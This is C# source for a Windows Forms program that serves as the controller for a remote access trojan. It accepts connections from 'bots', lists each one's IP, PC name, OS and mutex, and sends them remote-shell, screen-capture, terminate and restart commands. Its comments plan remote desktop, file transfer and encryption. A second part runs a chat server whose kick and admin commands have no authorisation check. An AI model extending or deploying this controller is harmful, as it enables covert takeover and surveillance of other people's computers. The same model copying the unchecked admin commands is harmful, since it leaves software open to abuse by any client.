using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
//for Streams
//to run commands concurrently
//for IPEndPoint

namespace ReverseAppClient
{
    /// <summary> 
    /// 
    ///   A Realizar en APP:  
    ///  ~Conexion de cliente con columnas:  ~[Ip externa y red], ~[Nombre PC/Nombre usuario], ~[S.O.], ~[Mutex]
    ///  ~Actualizacion de items Hastable por cada conexion nueva 
    ///  ~Agregar y borrar de lista de elementos los conectados y no conectados (detectar el momento en el que se desconectan los sockets)    
    ///  ~Configurar ventanas independientes por conexion (control center)
    ///  ~Shell remoto en ventanas independientes por cada conexion (Usar Menu contextual)
    /// - Capacidad de manipular un archivo Ini y agregarlo al servidor  (Configuraci�n archivo ini), Uso de recursos
    /// - Pruebas de uso rudo, manejo de errores para conexiones y desconexiones (red)
    /// - Transferencia de archivos en general
    /// - GUI de Cliente   
    /// - Escritorio remoto (Capturas de pantalla, control remoto)
    /// - Validaci�n robusta de multiples escritorios, shells, comandos
    /// - File manager
    /// 
    ///     
    /// A realizar en Servidor: 
    ///   - Determinar informaci�n b�sica que ira a Archivo ini
    ///   - Cargar configuraci�n de resource al momento de ejecutar
    ///   - Rutina robusta y validada de envio de datos (comandos)
    ///   - Prueba de fuego, que soporte transferencias y actividades paralelas
    ///   - Cifrado de datos    
    /// </summary>


    public partial class Principal : Form
    {
        private volatile bool _isShuttingDown;
        private readonly object _usuariosLock = new object();
        private readonly object _botsLock = new object();
        private readonly RemoteMessageParser _protocolParser = new RemoteMessageParser();
        private SocketListenerTransport _transport;
        Hashtable _listaBots = new Hashtable();
        Miscelanea _msc = new Miscelanea();
        private int _contRepeticion;
        List<UsuariosChat> listaUsuariosChat = new List<UsuariosChat>();
        public List<string> ListaCanales = new List<string>();
        private Socket _socketRepeticion;
        private const int MaxClientesCanal = 50;

        public Principal()
        {
            InitializeComponent();
        }

        private void RunOnUi(MethodInvoker action)
        {
            if (_isShuttingDown || IsDisposed || !IsHandleCreated)
            {
                return;
            }

            if (InvokeRequired)
            {
                try
                {
                    BeginInvoke(action);
                }
                catch (ObjectDisposedException)
                {
                }
                catch (InvalidOperationException)
                {
                }
            }
            else
            {
                action();
            }
        }

        private void SetStatusText(string message)
        {
            RunOnUi(delegate
            {
                toolStripStatusLabel1.Text = message;
            });
        }

        private void CloseSocket(Socket sck)
        {
            if (sck == null)
            {
                return;
            }

            try
            {
                sck.Shutdown(SocketShutdown.Both);
            }
            catch
            {
            }

            try
            {
                sck.Close();
            }
            catch
            {
            }
        }

        private List<UsuariosChat> ObtenerUsuariosChatSnapshot()
        {
            lock (_usuariosLock)
            {
                return new List<UsuariosChat>(listaUsuariosChat);
            }
        }
        
        
        private void Form1_Shown(object sender, EventArgs e)
        {          
            textBox2.Focus();   
                               
        }

        private void HandleTransportClientError(Socket socket, Exception err)
        {
            if (!_isShuttingDown)
            {
                DisplayMessage("<Error en conexion:  " + err.Message + " " + socket.GetHashCode() + ">\n");
            }
        }

        private bool ProcessIncomingBuffer(Socket socketNuevo, StringBuilder strInput)
        {
            string cadenaEvaluar = EvaluaCadena(strInput, socketNuevo);

            if (cadenaEvaluar.Length == 0) // Evitar repeticion de datos
            {
                if (strInput.ToString().Length == 2)
                {
                    if (socketNuevo == _socketRepeticion)
                    {
                        _contRepeticion++;
                    }
                    else
                    {
                        _contRepeticion = 0;
                    }

                    _socketRepeticion = socketNuevo;
                    if (_contRepeticion > 5)
                    {
                        _contRepeticion = 0;
                        DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\r\n");
                        string formarCadena273 = "273 " + ObtenerNickPorHash(socketNuevo.GetHashCode().ToString());
                        EnviarBroadCast(formarCadena273, socketNuevo.GetHashCode().ToString(), ObtenerCanalPorHash(socketNuevo.GetHashCode().ToString()));
                        EliminarClienteLista(socketNuevo);
                        return false;
                    }
                }

                if (strInput.ToString().Length < 300 && strInput.ToString().Length > 2)
                {
                    DisplayMessage(strInput.ToString());
                }
            }
            else
            {
                var activeForm = ActiveForm;
                if (activeForm != null && !activeForm.IsDisposed)
                {
                    for (int ctx = 0; ctx < activeForm.MdiChildren.Length; ctx++) // Salida global de comandos
                    {
                        if (Convert.ToString(activeForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                        {
                            var pnlControl = (PanelDeControl)activeForm.MdiChildren[ctx];
                            try
                            {
                                pnlControl.textBox1.AppendText(strInput.ToString().Split('|')[0] + "\r\n");

                                //Formato al texto de Shell
                                if (pnlControl.textBox1.Text.Substring(pnlControl.textBox1.Text.Length - 3, 1) == ">")
                                {
                                    pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2);
                                    pnlControl.textBox1.SelectionStart = pnlControl.textBox1.TextLength;
                                    pnlControl.textBox1.ScrollToCaret();
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.ToString());
                            }
                        }
                    }
                }
            }

            return true;
        }
         


        //Evalua cadena para devolver un Hash compatible que identifique a 
        //la ventana en caso de estar la salida redirigida a un hash en especifico
        string EvaluaCadena(StringBuilder cadena, Socket sck)
        {
            string s;
            if (ProcesarComandosApp(cadena, sck, out s)) return s;
            ProcesarComandosChat(cadena, sck);

            return "";

        }


         

        // Despachador de comandos de la aplicacion, el usuario envia comando y  este es procesado en esta pequeña funcion
        private bool ProcesarComandosApp(StringBuilder cadena, Socket sck, out string s)
        {
            var cadEv = cadena.ToString();

            RatHandshakeMessage handshake;
            if (_protocolParser.TryParseHandshake(cadena, out handshake))
            {
                AgregaNuevoServer(handshake.ClientIp, handshake.PcName, handshake.OsName, handshake.Mutex, sck.GetHashCode().ToString());
                lock (_botsLock)
                {
                    _listaBots[handshake.Raw] = sck;
                }

                string hashSck = sck.GetHashCode().ToString();
                DisplayMessage("\n<Conexi�n:" + hashSck + ">\n");
                EnviarComando("<:asignahash:> " + hashSck, sck);
                s = "";
                return true;
            }

            RoutedWindowMessage routed;
            if (_protocolParser.TryParseRoutedWindow(cadena, out routed))
            {
                var activeForm = ActiveForm;
                if (activeForm == null || activeForm.IsDisposed)
                {
                    s = "";
                    return false;
                }

                for (int ctx = 0; ctx < activeForm.MdiChildren.Length; ctx++)
                {
                    if (Convert.ToString(activeForm.MdiChildren[ctx].Tag) == routed.WindowTag)
                    {
                        s = routed.WindowTag;
                        return true;
                    }
                }
            }

            // Comandos
            // Respuesta imagen de captura
            CaptureMessage capture;
            if (_protocolParser.TryParseCapture(cadEv, out capture))
            {
                ProcesarCaptura(capture);
            }
            s = "";
            return false;
        }

        private void ProcesarCaptura(CaptureMessage capture) // Procesa captura y la manda al picturebox
        {
            try
            {
                byte[] bytes = capture.ImageBytes;
                string cadenaEvaluar = capture.WindowTag;

                // Devolver ventana
                var activeForm = ActiveForm;
                if (activeForm == null || activeForm.IsDisposed)
                {
                    return;
                }

                for (int ctx = 0; ctx < activeForm.MdiChildren.Length; ctx++)
                {
                    if (Convert.ToString(activeForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
                    {
                        var pnlControl = (PanelDeControl)activeForm.MdiChildren[ctx];
                        using (MemoryStream memoryStream = new MemoryStream(bytes))
                        {
                            Image image = Image.FromStream(memoryStream);
                            pnlControl.pictureBox1.Image = image;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Write(ex.Message);
            }
        }

        int EncontrarIndiceHash(DataGridView dvg, string hash) // Encuentra indice en base al Socket hash como parametro
        {
            for (int j = 0; j < dvg.Rows.Count; j++)
            {
                if (dvg[4, j].Value.ToString().Trim() == hash)
                    return j;
            }
            return -1;
        }


        // Realiza limpieza al desconectarse un cliente
        private void Cleanup(Socket sck)
        {
            try
            {
                RunOnUi(delegate
                {
                    var indice = EncontrarIndiceHash(dataGridView1, sck.GetHashCode().ToString());
                    if (indice >= 0 && indice < dataGridView1.Rows.Count)
                    {
                        dataGridView1.Rows.RemoveAt(indice);
                    }
                });
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }
        }



        private void CleanupGeneral()
        {
            _isShuttingDown = true;

            try
            {
                if (_transport != null)
                {
                    _transport.Stop();
                }
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }

            lock (_botsLock)
            {
                _listaBots.Clear();
            }

            lock (_usuariosLock)
            {
                listaUsuariosChat.Clear();
            }

            SetStatusText(@"Conexion perdida");
        }


        

        private delegate void DisplayDelegate(string message);
        private void DisplayMessage(string message)
        {
            RunOnUi(delegate
            {
                textBox1.AppendText(message);
            });
        }


        private delegate void NuevoServer(string message, string pcUser, string so, string mutex, string sckHash);
        private void AgregaNuevoServer(string message, string pcUser, string so, string mutex, string sckHash)
        {
            RunOnUi(delegate
            {
                var index = dataGridView1.Rows.Add();
                dataGridView1.Rows[index].Cells["IPEquipo"].Value = message;
                dataGridView1.Rows[index].Cells["NombrePC"].Value = pcUser;
                dataGridView1.Rows[index].Cells["SistemaOperativo"].Value = so;
                dataGridView1.Rows[index].Cells["Mutex"].Value = mutex;
                dataGridView1.Rows[index].Cells["HashSocket"].Value = sckHash;
            });
        }

        
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    EnviaComandoTexto();
                }
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
            }
            
        }

        private void EnviaComandoTexto()
        {
            if (textBox2.Text == @"cls")
            {                
                textBox1.Text = "";
                return;
            }
           
            EnviarComando(textBox2.Text);                      
            textBox2.Text = "";
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MessageBox.Show(@"¿Desea salir del programa?", @"Salir", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {                
                e.Cancel = false;
                CleanupGeneral();
            }
            else
            {
                e.Cancel = true;
            }
            
        }

        private void Form1_Load(object sender, EventArgs e) // Basado en hilos
        {
            ListaCanales.Add("Manga-Anime");
            ListaCanales.Add("Hackers");
            _transport = new SocketListenerTransport(ProcessIncomingBuffer, HandleTransportClientError, Cleanup, SetStatusText, DisplayMessage);
            _transport.Start(5760);
        }

        private void button1_Click(object sender, EventArgs e) // Boton de ejemplo para enviar un comando
        {
             
        }

        private void EnviarComando(string comando) // Enviar comando al elemento seleccionado en Dvw
        {            
            string mensaje = comando;
            string cadenaForm;
            Funciones x = new Funciones();

            cadenaForm = x.FormarCadena(dataGridView1); //Enviar al elemento seleccionado del DataGridView            
            Socket sckEnviar;
            lock (_botsLock)
            {
                sckEnviar = (Socket)_listaBots[cadenaForm];
            }
            DisplayMessage("<" + sckEnviar.GetHashCode()  + ">" + comando + "\r\n");
            NetworkStream nStr = new NetworkStream(sckEnviar);
          
            StreamWriter strw = new StreamWriter(nStr);
            StringBuilder strib = new StringBuilder();
            strib.Append(mensaje);
            strw.WriteLine(strib);
            strw.Flush();
            strw.Close();
            nStr.Close();
        }


        public void EnviarComando(string comando, string cadenaInicio) // Enviar comando por cadena inicio
        {
            string mensaje = comando;

            var cadenaForm = cadenaInicio;
            Socket sckEnviar;
            lock (_botsLock)
            {
                sckEnviar = (Socket)_listaBots[cadenaForm];
            }
            DisplayMessage("<" + sckEnviar.GetHashCode() + ">" + comando.Trim() +"|");
            NetworkStream nStr = new NetworkStream(sckEnviar);

            StreamWriter strw = new StreamWriter(nStr);
            StringBuilder strib = new StringBuilder();
            strib.Append(mensaje);
            strw.WriteLine(strib);
            strw.Flush();
            strw.Close();
            nStr.Close();
        }





        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            EnviarComando("<:hola:>");
        }

        private void dataGridView1_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            
         
        }

        private void dataGridView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                contextMenuStrip1.Show();
            }
        }

        private void cerrarServidorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count > 0)
            {
                CerrarPanel(dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString());
                EnviarComando("<:terminar:>");
            }
        }

        void CerrarPanel(string hash)
        {
            //MessageBox.Show(hash);
            var activeForm = ActiveForm;
            if (activeForm == null || activeForm.IsDisposed)
            {
                return;
            }

            for (int ctx = 0; ctx < activeForm.MdiChildren.Length; ctx++)
            {
                if (Convert.ToString(activeForm.MdiChildren[ctx].Tag) == hash)
                {
                    var pnlControl = (PanelDeControl)activeForm.MdiChildren[ctx];
                    pnlControl.Close();                    
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
             EnviaComandoTexto();           
        }

        private void abrirVentanaToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (dataGridView1.Rows.Count > 0)
            {
                PanelDeControl ventana = new PanelDeControl();
                Funciones x = new Funciones();              
                ventana.Text = x.FormarCadena(dataGridView1);
                ventana.Tag = dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString();
                var activeForm = ActiveForm;
                if (activeForm != null && !activeForm.IsDisposed)
                {
                    _msc.MostrarMdi(activeForm, ventana, "PanelDeControl", Convert.ToString(ventana.Tag));
                }
            }
        }

     

        private void button2_Click(object sender, EventArgs e)
        {
            Funciones x = new Funciones();
            var cadenaForm = x.FormarCadena(dataGridView1);
            Socket sckEnviar;
            lock (_botsLock)
            {
                sckEnviar = (Socket)_listaBots[cadenaForm];
            }
            MessageBox.Show( sckEnviar.Connected.ToString());
        }
        private void reiniciarServidorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            EnviarComando("<:reiniciar:>");
        }
        private void EnviarComando(string comando, Socket sck)
        {
            string mensaje = comando;

            try
            {
                DisplayMessage("<" + sck.GetHashCode() + ">");
                NetworkStream nStr = new NetworkStream(sck);
                if (nStr == Stream.Null)
                {
                    MessageBox.Show(@"holaa");
                }
                StreamWriter strw = new StreamWriter(nStr);
                StringBuilder strib = new StringBuilder();
                strib.Append(mensaje);
                strw.WriteLine(strib);
                strw.Flush();
                strw.Close();
                nStr.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }



        #region ServidorEshare



        private void button4_Click(object sender, EventArgs e)
        {
            // Mensaje Admin
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                EnviarComando("700 " + textBox4.Text, usr.SocketUsr);
            }
            textBox4.Text = "";
        }


    
        // Procesa la secuencia de comandos eshare
        void ProcesarComandosChat(StringBuilder cadena, Socket sck)
        {
            var cadEv = cadena.ToString();

            if (cadEv.Length >= 3)
            {
                switch (cadEv.Substring(0, 3))
                {
                    case "100": // Cadena inicial
                        string nuevoNickName = cadEv.Split(':')[1];
                        string nuevoCanal = cadEv.Split(':')[3];
                        string nuevoCliente = cadEv.Split(':')[0].Substring(3, cadEv.Split(':')[0].Length - 3);

                        if (ValidarNickNameCanal(nuevoNickName, nuevoCanal))
                        {
                            int totalUsuarios;
                            lock (_usuariosLock)
                            {
                                totalUsuarios = listaUsuariosChat.Count + 1;
                            }

                            // Avisar a todos que el usuario ingres� al chat
                            string formarCadena264 = "264 " + nuevoNickName;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), nuevoCanal);
                            // Enviar cadena de aceptaci�n y lista de usuarios de canal
                            string formarCadena202 = "202 " + nuevoNickName + ":" + totalUsuarios + ";" +
                                                     nuevoCanal + ":" + ContarUsuariosCanal(nuevoCanal) + ":" + "0";
                            lock (_usuariosLock)
                            {
                                listaUsuariosChat.Add(new UsuariosChat(nuevoNickName, nuevoCanal, nuevoCliente, sck));
                            }
                            EnviarComando(formarCadena202, sck);
                            string formarCadena222 = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                            EnviarComando(formarCadena222, sck);
                        }
                        break;
                    case "220": // Enviar listado de usuarios del canal a peticion de usuario                      
                        string formarCadena222X = "222 " + DevolverUsuariosCanal220(sck.GetHashCode().ToString());
                        EnviarComando(formarCadena222X, sck);
                        break;
                    case "248": //Mensaje publico
                        string mensaje = cadEv.Substring(4, cadEv.Length - 4);
                        string formarCadena270 = "270 " + ObtenerNickPorHash(sck.GetHashCode().ToString()) + ":" + mensaje;
                        EnviarBroadCast(formarCadena270, sck.GetHashCode().ToString(), ObtenerCanalPorHash(sck.GetHashCode().ToString()));
                        break;
                    case "255": // Mensaje Privado
                        string nickDestino = cadEv.Substring(4, cadEv.Length - 4).Split(':')[0];
                        string nickOrigen = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        string mensajeprivado = cadEv.Substring(cadEv.IndexOf(":", 0, StringComparison.Ordinal) + 1);
                        EnviarMensajePrivado(nickOrigen, nickDestino, mensajeprivado);
                        EnviarComando("280 " + nickDestino, sck);
                        break;
                    case "260": // Solicita cambio de canal
                        int numeroUsuarios = 0;
                        string canalOrigen = ObtenerCanalPorHash(sck.GetHashCode().ToString());
                        string canalDestino = cadEv.Substring(4, cadEv.Length - 4).Trim();
                        string nombreUsuarioCanal = ObtenerNickPorHash(sck.GetHashCode().ToString());
                        if (RealizarCambioCanal(canalDestino, ref numeroUsuarios, sck))
                        {
                            string formarCadenaCambioAprobadoCanal = "262 " + canalDestino + ":" + numeroUsuarios + ":" + "0";
                            EnviarComando(formarCadenaCambioAprobadoCanal, sck);
                            string formarCadena263CambiaCanal = "263 " +
                                                                nombreUsuarioCanal + ":" +
                                                                canalDestino;
                            EnviarBroadCast(formarCadena263CambiaCanal, sck.GetHashCode().ToString(), canalOrigen);
                            string formarCadena264 = "264 " + nombreUsuarioCanal;
                            EnviarBroadCast(formarCadena264, sck.GetHashCode().ToString(), canalDestino);
                        }
                        else
                        {
                            string cadenabadRoom = "404 Bad Room Request";
                            EnviarComando(cadenabadRoom, sck);
                        }
                        break;
                    case "300": // solicita lista de canales publicos
                        foreach (var canal in ListaCanales)
                        {
                            string formarCadenaCanal = "310 " + canal + ":0:" + DevolverNumUsuariosCanal(canal) + ":" + MaxClientesCanal;
                            EnviarComando(formarCadenaCanal, sck);
                        }
                        break;

                    case "418": // Peticion de administrador
                    case "451": // Peticion de moderador, screener o speaker                              
                        string[] tokens = cadEv.Split(' ');
                        string nickNameExpulsar = "";
                        if (tokens.Length > 1)
                        {
                            switch (tokens[1].Trim())
                            {
                                case "ADMIN":
                                case "1:":
                                case "2:":
                                case "3:":
                                    string formarCadenaAdm = "413 ";
                                    EnviarComando(formarCadenaAdm, sck);
                                    break;
                                case "KICK":
                                    nickNameExpulsar = cadEv.Substring(9, cadEv.Length - 9).Trim();
                                    Socket socketExp = ObtenerSckPorNick(nickNameExpulsar);                                    
                                    string formarCadenaExpulsado = "276 " + nickNameExpulsar;
                                    EnviarBroadCastAdmin(formarCadenaExpulsado, sck.GetHashCode().ToString(), ObtenerCanalPorHash(socketExp.GetHashCode().ToString()));
                                    EliminarClienteLista(socketExp);
                                    socketExp.Close();
                                    break;
                            }
                        }
                        
                        break;

                }
            }

            // MessageBox.Show(CadEv.Substring(0, 3));
        }


        //Comprobacion al pedido 260 (cambiar canal)
        bool RealizarCambioCanal(string canalDestino, ref int numUsuarios, Socket sck)
        {
            numUsuarios = DevolverNumUsuariosCanal(canalDestino);
            if (numUsuarios < MaxClientesCanal)
            {
                lock (_usuariosLock)
                {
                    foreach (var usr in listaUsuariosChat)
                    {
                        if (sck == usr.SocketUsr)
                        {
                            usr.CanalActual = canalDestino;
                        }
                    }
                }
            }
            return numUsuarios < MaxClientesCanal;
        }


        //Elimina un socket de la lista 
        void EliminarClienteLista(Socket sck)
        {
            lock (_usuariosLock)
            {
                listaUsuariosChat.RemoveAll(usr => usr.SocketUsr == sck);
            }

        }


        //Envia mensaje privado a otro nick
        void EnviarMensajePrivado(string nickOrigen, string nickDestino, string mensaje)
        {
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (nickDestino == usr.NickName)
                {
                    EnviarComando("256 " + nickOrigen + ":" + mensaje, usr.SocketUsr);
                }
            }
        }


        // Validacion de nick y canal de usuarios
        bool ValidarNickNameCanal(string nickaValidar, string canalaValidar)
        {
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (nickaValidar == usr.NickName)
                {
                    return false;
                }
            }
            int cont = 0;
            foreach (string canal in ListaCanales)
            {
                if (canalaValidar.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }
            if (cont == 0)
                return false;

            return true;
        }


        //Contar usuarios en canal
        int ContarUsuariosCanal(string canal)
        {
            int contador = 0;
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (usr.CanalActual == canal)
                    contador++;
            }
            return contador;
        }


        //Devuelve lista de usuarios del canal donde se encuentra el hash actual
        string DevolverUsuariosCanal220(string hashSocket)
        {

            string canal = ObtenerCanalPorHash(hashSocket);
            string cadenaUsuarios = "";
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                // MessageBox.Show(usr.NickName + " : "+ usr.CanalActual);
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cadenaUsuarios += usr.NickName + ";";
                }
            }
            try
            {
                cadenaUsuarios = cadenaUsuarios.Substring(0, cadenaUsuarios.Length - 1);
            }
            catch (Exception ex)
            { }
            return canal + ":" + cadenaUsuarios;
        }


        // Numero de usuarios en determinado canal
        int DevolverNumUsuariosCanal(string canal)
        {
            int cont = 0;
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (usr.CanalActual.ToUpper() == canal.ToUpper())
                {
                    cont++;
                }
            }

            return cont;
        }


        // Canal por hash de sck
        private string ObtenerCanalPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                string hashUsuario = usr.SocketUsr.GetHashCode().ToString();
                if (hashUsuario == hashActual)
                {
                    return usr.CanalActual;
                }
            }
            return "No Existe canal";
        }


        //Nick por hash de sck
        private string ObtenerNickPorHash(string hashActual)
        {
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (usr.SocketUsr.GetHashCode().ToString() == hashActual)
                {
                    return usr.NickName;
                }
            }
            return "Sin Nick";
        }

        // Obtener Socket recorriendo la lista de usuarios por nickname
        private Socket ObtenerSckPorNick(string nick)
        {
            foreach (UsuariosChat usr in ObtenerUsuariosChatSnapshot())
            {
                if (usr.NickName == nick)
                {
                    return usr.SocketUsr;
                }
            }
            return null;
        }

        void EnviarBroadCast(string cadena, string hashActual, string canal)
        {
            List<UsuariosChat> lista2 = ObtenerUsuariosChatSnapshot();
            foreach (UsuariosChat usr in lista2)
            {
                //Debug.WriteLine("Recorre>" + usr.NickName  + " Hash: " + usr.SocketUsr.GetHashCode());
                if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                {
                    EnviarComando(cadena, usr.SocketUsr);                    
                }
            }
        }


        // Igual al enviar broadcast, pero enviando comando tambien al nick propio
        void EnviarBroadCastAdmin(string cadena, string hashActual, string canal)
        {
            List<UsuariosChat> lista2 = ObtenerUsuariosChatSnapshot();
            foreach (UsuariosChat usr in lista2)
            {
                Debug.WriteLine("Recorre>" + usr.NickName + " Hash: " + usr.SocketUsr.GetHashCode());
                if (string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                {
                    EnviarComando(cadena, usr.SocketUsr);
                }
            }
        }



        //Envia mensajes publicos usando el 270, 273


        #endregion




    }
}
